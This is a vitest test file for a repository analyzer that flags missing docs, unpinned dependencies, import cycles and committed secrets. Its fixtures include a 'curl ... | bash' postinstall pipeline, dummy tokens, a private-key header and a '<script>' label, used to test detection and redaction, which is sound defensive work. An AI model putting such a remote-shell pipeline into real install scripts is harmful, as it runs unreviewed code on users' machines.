import { describe, expect, it } from 'vitest';
import { analyzeRepository } from '../src/core/analyze';
import { reportToJson, reportToMarkdown } from '../src/core/export';
import { demoFiles } from '../src/demo';
import { snapshotFromFiles } from '../src/core/archive';
import { healthyFiles, snapshot } from './helpers';

const source = { kind: 'zip' as const, label: 'project.zip' };
const analyze = (files: Record<string, string> = healthyFiles) => analyzeRepository(snapshot(files), source, new Date('2026-01-01T00:00:00Z'));
const rules = (files: Record<string, string>) => analyze(files).findings.map(finding => finding.ruleId);

describe('deterministic evidence-backed checks', () => {
  it('gives a well-formed conventional fixture a clean report', () => {
    const report = analyze();
    expect(report.findings).toEqual([]);
    expect(report.score.overall).toBe(100);
    expect(report.summary.testFiles).toBe(1);
    expect(report.summary.manifests).toBe(1);
  });
  it('detects README, tests, manifest, license, CI, and hygiene omissions', () => {
    expect(rules({ 'src/main.ts': 'export const hello = 1;' })).toEqual(expect.arrayContaining([
      'docs.readme-missing', 'docs.license-missing', 'tests.missing', 'tests.ci-missing', 'deps.manifest-missing', 'structure.gitignore-missing',
    ]));
  });
  it('reports broken local docs with location, evidence, and a recommendation', () => {
    const report = analyze({ ...healthyFiles, 'README.md': healthyFiles['README.md'] + '\n[Missing guide](docs/missing.md)\n' });
    const finding = report.findings.find(item => item.ruleId === 'docs.broken-local-link');
    expect(finding).toMatchObject({ path: 'README.md', category: 'documentation', severity: 'low', confidence: 0.9 });
    expect(finding?.line).toBeGreaterThan(1);
    expect(finding?.evidence).toContain('docs/missing.md');
    expect(finding?.recommendation).toContain('Update');
  });
  it('does not call present binary or skipped link targets missing', () => {
    expect(rules({ ...healthyFiles, 'README.md': healthyFiles['README.md'] + '\n[Logo](logo.png)\n', 'logo.png': 'binary' })).not.toContain('docs.broken-local-link');
  });
  it('detects short documentation and absent setup guidance', () => {
    expect(rules({ ...healthyFiles, 'README.md': '# Project\nTiny.' })).toEqual(expect.arrayContaining(['docs.readme-thin', 'docs.setup-missing']));
  });
  it('recognizes inline Rust tests and conventional Go tests', () => {
    expect(rules({ 'src/lib.rs': '#[test]\nfn test_x() {}' })).not.toContain('tests.missing');
    expect(rules({ 'main.go': 'package main', 'main_test.go': 'package main' })).not.toContain('tests.missing');
  });
  it('does not treat a Markdown document named tests as automated tests', () => {
    const files = { 'src/main.py': 'print("hello")', 'docs/tests.md': '# Tests' };
    expect(rules(files)).toContain('tests.missing');
  });
  it('recognizes npm placeholders and invalid manifests without throwing', () => {
    expect(rules({ ...healthyFiles, 'package.json': JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }) })).toContain('tests.npm-command-missing');
    for (const content of ['{invalid', 'null', '[]']) expect(rules({ ...healthyFiles, 'package.json': content })).toContain('deps.invalid-package-json');
  });
  it('finds floating versions and missing lockfiles, including a workspace with a root lock', () => {
    const withoutLock: Record<string, string> = { ...healthyFiles, 'package.json': '{"dependencies":{"express":"latest"}}' };
    delete withoutLock['package-lock.json'];
    expect(rules(withoutLock)).toEqual(expect.arrayContaining(['deps.floating-version', 'deps.lockfile-missing']));
    expect(rules({ ...healthyFiles, 'packages/a/package.json': '{"dependencies":{"express":"^4.0.0"}}' })).not.toContain('deps.lockfile-missing');
    expect(rules({ ...healthyFiles, 'requirements.txt': 'requests\n' })).toContain('deps.python-unpinned');
  });
  it('redacts secret signatures and generic assignments from both exports', () => {
    const token = 'ghp_' + 'Ab29Cd38Ef47Gh56Ij65Kl74Mn83Op92Qr01';
    const password = ['super', 'sensitive', 'value', '278'].join('-');
    const report = analyze({ ...healthyFiles, 'src/config.ts': `export const token = "${token}";\nconst password = "${password}";\n` });
    expect(report.findings).toEqual(expect.arrayContaining([expect.objectContaining({ ruleId: 'security.github-token', severity: 'critical', path: 'src/config.ts', line: 1 }), expect.objectContaining({ ruleId: 'security.hardcoded-secret', line: 2 })]));
    for (const output of [reportToJson(report), reportToMarkdown(report)]) { expect(output).not.toContain(token); expect(output).not.toContain(password); expect(output).toContain('redacted'); }
    expect(report.score.overall).toBeLessThanOrEqual(49);
  });
  it('recognizes PEM headers and committed environment files, but not sanitized placeholders', () => {
    const header = ['-----BEGIN ', 'PRIVATE KEY-----'].join('');
    const report = analyze({ ...healthyFiles, 'private.pem': header, '.env': 'DATABASE_URL=postgres://internal/db\nAPI_KEY=your-api-key', '.env.example': 'API_KEY=your-api-key' });
    expect(report.findings.find(item => item.ruleId === 'security.private-key')).toMatchObject({ path: 'private.pem', line: 1 });
    expect(report.findings.filter(item => item.ruleId === 'security.env-file')).toHaveLength(1);
    expect(reportToJson(report)).not.toContain('postgres://internal/db');
    expect(rules({ ...healthyFiles, 'src/config.ts': 'const password = "your-password-here";' })).not.toContain('security.hardcoded-secret');
  });
  it('flags remote shell pipelines without reproducing the command', () => {
    const script = 'curl https://example.invalid/setup.sh | bash';
    const report = analyze({ ...healthyFiles, 'package.json': JSON.stringify({ scripts: { test: 'vitest', postinstall: script } }) });
    expect(report.findings.some(item => item.ruleId === 'deps.remote-shell-script')).toBe(true);
    expect(reportToJson(report)).not.toContain(script);
  });
  it('finds circular relative imports and gives the closing-edge line', () => {
    const report = analyze({ ...healthyFiles, 'src/a.ts': 'import { b } from "./b";\nexport const a = b;', 'src/b.ts': 'import { a } from "./a.js";\nexport const b = a;' });
    expect(report.findings.find(item => item.ruleId === 'arch.import-cycle')).toMatchObject({ path: 'src/b.ts', line: 1, category: 'architecture' });
    expect(report.findings.find(item => item.ruleId === 'arch.import-cycle')?.evidence).toContain('src/a.ts');
  });
  it('flags large modules and high static-import fanout', () => {
    const imports = Array.from({ length: 21 }, (_, index) => `import value${index} from "module-${index}";`).join('\n');
    expect(rules({ ...healthyFiles, 'src/big.ts': imports + '\n' + 'doWork();\n'.repeat(401) })).toEqual(expect.arrayContaining(['arch.large-module', 'arch.import-fanout']));
  });
  it('keeps results stable under input reordering', () => {
    const files = { ...healthyFiles, 'src/big.ts': 'doWork();\n'.repeat(401), 'requirements.txt': 'requests' };
    expect(analyze(files)).toEqual(analyze(Object.fromEntries(Object.entries(files).reverse())));
  });
  it('produces a real report for the bundled demo', () => {
    const report = analyzeRepository(snapshotFromFiles(demoFiles), { kind: 'demo', label: 'demo' });
    expect(report.findings.map(item => item.ruleId)).toEqual(expect.arrayContaining(['tests.missing', 'deps.lockfile-missing', 'arch.import-cycle']));
    expect(report.summary.scannedFiles).toBe(5);
  });
  it('retains a late critical signal when a noisy input exceeds the finding cap', () => {
    const noisy = Object.fromEntries(Array.from({ length: 6 }, (_, index) => [`src/a${index}.ts`, Array.from({ length: 100 }, () => 'const password = "sensitive-value-928";').join('\n')]));
    const token = 'ghp_' + 'Ab29Cd38Ef47Gh56Ij65Kl74Mn83Op92Qr01';
    const report = analyze({ ...healthyFiles, ...noisy, 'src/z.ts': `export const credential = "${token}";` });
    expect(report.findings).toHaveLength(500);
    expect(report.findings[0]).toMatchObject({ ruleId: 'security.github-token', severity: 'critical', path: 'src/z.ts' });
    expect(report.warnings.join(' ')).toContain('500 highest-priority');
  });
  it('escapes Markdown source labels and emits parseable versioned JSON', () => {
    const report = { ...analyze(), source: { kind: 'zip' as const, label: '<script>_hello_`' } };
    expect(reportToMarkdown(report)).toContain('\\<script\\>\\_hello\\_\\`');
    expect(JSON.parse(reportToJson(report)).schemaVersion).toBe(1);
  });
});
